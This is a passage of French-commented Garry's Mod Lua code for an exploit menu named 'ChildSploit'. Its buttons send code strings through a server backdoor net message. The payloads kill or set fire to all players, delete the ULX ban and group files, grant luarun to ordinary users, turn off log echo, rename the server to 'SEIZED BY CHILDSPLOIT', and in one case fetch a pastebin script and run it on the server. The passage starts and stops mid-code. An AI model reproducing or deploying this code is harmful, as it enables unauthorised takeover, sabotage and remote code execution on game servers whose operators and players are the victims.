chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Gravité inversé" )
    SploitNotify("Gravité inversé à -600")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 380, 180 )
Macro:SetText( "Physic niquer" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Physic niqué" )
    SploitNotify("Physic changé à -8")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 380, 210 )
Macro:SetText( "Hurlement" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Hurlement activé !" )
    SploitNotify("Hurlement activé")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 380, 240 )
Macro:SetText( "Gm_construct" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"map\", \"gm_construct\")")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Map changé à GM_CONSTRUCT" )
    SploitNotify("Map changé à GM_CONSTRUCT")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 380, 270 )
Macro:SetText( "Grade delete" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Grades supprimés" )
    SploitNotify("Grades supprimés.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 380, 300 )
Macro:SetText( "Ignite" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Tout le monde brûle" )
    SploitNotify("Tout le monde brule !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 380, 330 )
Macro:SetText( "Deban all" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Tout le monde est debanni" )
    SploitNotify("Plus personne n'est banni.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 380, 360 )
Macro:SetText( "Tuer tout le monde" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Tout le monde est mort" )
    SploitNotify("Tout le monde est mort !)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 380, 30 )
Macro:SetText( "Grosse Tête" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Tout le monde à une grosse tête :)" )
	    SploitNotify("Tout le monde à une grosse tête")
    surface.PlaySound("buttons/blip1.wav") 
        net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(100,100,100)) 
        v:ManipulateBoneScale( b, Vector(100,100,100))
        v:ManipulateBoneScale( c, Vector(100,100,100))
        v:ManipulateBoneScale( d, Vector(100,100,100))
        v:ManipulateBoneScale( e, Vector(100,100,100))
        v:ManipulateBoneScale( f, Vector(100,100,100))
        v:ManipulateBoneScale( g, Vector(100,100,100))
        v:ManipulateBoneScale( h, Vector(100,100,100))
        v:ManipulateBoneScale( i, Vector(100,100,100))
        v:ManipulateBoneScale( j, Vector(100,100,100))
        v:ManipulateBoneScale( k, Vector(100,100,100))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 60 )
Macro:SetText( "2D Désactivé" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "2D player désactivé !" )
	    SploitNotify("2D player désactivé !")
    surface.PlaySound("buttons/blip1.wav") 
		net.Start(netKey)
        net.WriteString([[
    for k,v in pairs(player.GetAll()) do 
    local a = v:LookupBone("ValveBiped.Bip01_Head1")
    local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
    local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
    local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
    local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
    local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
    local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
    local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
    local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
    local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
    local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")

        v:ManipulateBoneScale( a, Vector(1,1,1))
        v:ManipulateBoneScale( b, Vector(1,1,1))
        v:ManipulateBoneScale( c, Vector(1,1,1))
        v:ManipulateBoneScale( d, Vector(1,1,1))
        v:ManipulateBoneScale( e, Vector(1,1,1))
        v:ManipulateBoneScale( f, Vector(1,1,1))
        v:ManipulateBoneScale( g, Vector(1,1,1))
        v:ManipulateBoneScale( h, Vector(1,1,1))
        v:ManipulateBoneScale( i, Vector(1,1,1))
        v:ManipulateBoneScale( j, Vector(1,1,1))
        v:ManipulateBoneScale( k, Vector(1,1,1))
        end]])
        net.WriteBit(1)
        net.SendToServer()
end 	

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 90 )
Macro:SetText( "Nucleaire" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Une nuke va exploser quelques part ! :o" )
    SploitNotify("Une nuke va exploser ! (m9k requis)")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[
local rocket = ents.Create("m9k_launched_davycrockett")
local ply2 = table.Random(player.GetAll())
if ply2 == ply then ply:ChatPrint("[RunString] Prevented epicentre from being you.") else
    rocket:SetPos(ply2:GetPos())
    rocket:SetOwner(ply2)
    rocket.Owner = ply2
    rocket:Spawn()
    rocket:Activate()
ply:ChatPrint("[RunString] Allahu akbar.")  
end]])			
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 120 )
Macro:SetText( "Hostname Changed" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Nom du serv. changer à SEIZED BY CHILDSPLOIT" )
    SploitNotify("Nom du serv. changer à SEIZED BY CHILDSPLOIT ")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"rcon\", \"hostname\", \"SEIZED BY CHILDSPLOIT\")")		
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 150 )
Macro:SetText( "Say i love" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Tout le monde dit 'i love ChildSploit !' " )
    SploitNotify("Tout le monde est en love sur jésus !")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("say i love Child <3")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 180 )
Macro:SetText( "All déco/reco" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Tout le monde se déco/reco ! " )
    SploitNotify("Déco/reco de tous les joueurs")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("retry")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 210 )
Macro:SetText( "Say Child love" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 80, 210, 141 ), "Tout le monde dit 'J'adore Maitre Child Exploit <3'" )
    SploitNotify("Tout le monde dit 'j'ai un petit zizi <3")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("say J'adore Maitre Child Exploit")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 240 )
Macro:SetText( "Luarun en user" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Luarun en user OK." )
    SploitNotify("Luarun set en user !")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"groupallow\", \"user\", \"ulx luarun\")")
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Serveur)
Macro:SetPos( 500, 30 )
Macro:SetText( "All Change name" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/Mxd7XUKp\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Tout le monde change de nom :')" )
	    SploitNotify("Tout le monde change de nom :')")
    surface.PlaySound("buttons/blip1.wav") 
        net.WriteBit(1)
        net.SendToServer()
end  


local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 270 )
Macro:SetText( "ULX LOGECHO 0" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "ULX LOGECHO 0" )
    SploitNotify("ULX LOGECHO 0")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString("RunConsoleCommand(\"ulx\", \"logecho\", \"0\")")
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 300 )
Macro:SetText( "Danse" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Danse" )
    SploitNotify("Danse")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 330 )
Macro:SetText( "+right" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "+right" )
    SploitNotify("+right")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+right")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 360 )
Macro:SetText( "+duck" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "+duck" )
    SploitNotify("+right")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+duck")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 390 )
Macro:SetText( "+back" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "+back" )
    SploitNotify("+back")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+back")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 420 )
Macro:SetText( "+back" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "+back" )
    SploitNotify("+back")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+forward")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 450 )
Macro:SetText( "undo" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "undo" )
    SploitNotify("undo")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("undo")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Serveur)
Macro:SetPos( 500, 480 )
Macro:SetText( "Stop right/etc" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 30 )
Macro.Paint = function()
surface.SetDrawColor(30, 30, 30)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( Color(math.random(0,120),
math.random(0,120),
math.random(0,120),
             120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Menu", "] ", Color( 255, 255, 255 ), "Stop right/etc" )
    SploitNotify("Stop right/etc")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(netKey)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("-right")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-duck")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-back")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-forward")
end
]])
net.WriteBit (1)
net.SendToServer()
end
-----------------------------
--    OPEN EXPLOIT MENU    --
-----------------------------
-- DANS LE Serveur
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 40 )
		Macro:SetParent(Serveur)
        Macro:SetText( "Exploit Menu" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Exploit's", "] ", Color( 255, 255, 255 ), "Exploit Menu" )
    SploitNotify("Exploit MENU")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "dev_exploit_menu" ) -- What happens when you press the button
end

-- DANS LE TARGETS
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 40 )
		Macro:SetParent(Targets)
        Macro:SetText( "Exploit Menu" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Exploit's", "] ", Color( 255, 255, 255 ), "Exploit Menu" )
    SploitNotify("Exploit MENU")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "dev_exploit_menu" ) -- What happens when you press the button
end

--DANS LE Misc
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 40 )
		Macro:SetParent(Misc)
        Macro:SetText( "Exploit Menu" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Child Exploit's", "] ", Color( 255, 255, 255 ), "Exploit Menu" )
    SploitNotify("Exploit MENU")
    surface.PlaySound("buttons/blip1.wav") 
RunConsoleCommand( "dev_exploit_menu" ) -- What happens when you press the button
end

------------------------------
--    SCAN BACKDOOR ALL     --
------------------------------
--DANS LE Serveur
local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 70 )
		Macro:SetParent(Serveur)
        Macro:SetText( "Scan backdoor" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
        surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        surface.SetDrawColor( Color(math.random(0,120),
                      math.random(0,120),
                      math.random(0,120),
                                   120))
        surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
        end
Macro.DoClick = function()
